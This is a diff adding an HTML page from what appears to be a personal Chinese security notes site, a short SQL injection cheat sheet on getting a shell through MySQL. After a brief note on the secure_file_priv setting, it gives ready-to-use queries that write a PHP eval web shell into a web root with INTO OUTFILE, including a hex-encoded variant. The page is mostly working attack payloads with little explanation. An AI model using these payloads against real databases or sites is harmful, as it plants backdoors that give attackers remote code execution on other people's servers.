@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>sql注入 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "sql\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "getshell", url: "#getshell" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%9C%8D%E5%8A%A1%E7%B1%BB/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%9C%8D%E5%8A%A1%E7%B1%BB/" class="btn btn-xs btn-link">
+        服务类
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-link">
+        redis的一些攻击方式
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="sql">sql注入</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#getshell">getshell</a><ul>
+<li><a href="#into-outfile">into outfile</a></li>
+<li><a href="#into-outfilehex">into outfile（hex）</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="getshell">getshell</h2>
+<h3 id="into-outfile">into outfile</h3>
+<p>show global variables like '%secure%';</p>
+<pre><code class="language-纯文本">secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
+
+当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
+
+当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
+</code></pre>
+<p>select '\&lt;?php eval(\$_POST[yyj]);?&gt;' into outfile "C/phpstudy/www/shell.php";</p>
+<h3 id="into-outfilehex">into outfile（hex）</h3>
+<pre><code class="language-纯文本">union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\xxxxxx\phpStudy\WWW\outfile.php'
+</code></pre>
+<p>其中0x3c3f706870206576616c28245f524551554553545b315d293b3f3e是\&lt;?php eval(\$_REQUEST[123]);?&gt; 的hex编码</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%9C%8D%E5%8A%A1%E7%B1%BB/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%9C%8D%E5%8A%A1%E7%B1%BB/" class="btn btn-xs btn-link">
+        服务类
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="btn btn-xs btn-link">
+        redis的一些攻击方式
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
